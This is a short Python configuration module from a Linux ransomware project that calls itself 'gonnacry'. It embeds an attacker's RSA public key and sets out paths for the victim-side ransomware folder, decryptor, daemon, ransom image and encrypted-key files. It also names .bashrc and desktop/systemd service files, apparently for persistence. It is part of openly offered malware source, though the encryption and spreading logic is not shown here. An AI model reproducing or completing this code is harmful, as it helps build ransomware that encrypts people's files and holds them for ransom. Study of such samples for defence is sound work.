import os

import environment 

# const variables
server_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----"""

# environment paths
ransomware_name = "gonnacry"
test_path = "/home/tarcisio/test/"

home = environment.get_home_path()
desktop = environment.get_desktop_path()
username = environment.get_username()
ransomware_path = os.path.join(home, ransomware_name)
decryptor_path = os.path.join(ransomware_path, "decryptor")
daemon_path = os.path.join(ransomware_path, "daemon")
img_path = os.path.join(ransomware_path, "img.png")
gonnacry_path = ''
bashrc_path = os.path.join(home, '.bashrc')
daemon_desktop = os.path.join(ransomware_path, 'daemon.desktop')
daemon_service = os.path.join(ransomware_path, 'daemon.service')

aes_encrypted_keys_path = os.path.join(ransomware_path, "AES_encrypted_keys.txt")
encrypted_client_private_key_path = os.path.join(ransomware_path, 'encrypted_client_private_key.key')
client_public_key_path = os.path.join(ransomware_path, "client_public_key.PEM")

gonnacry = ''''''
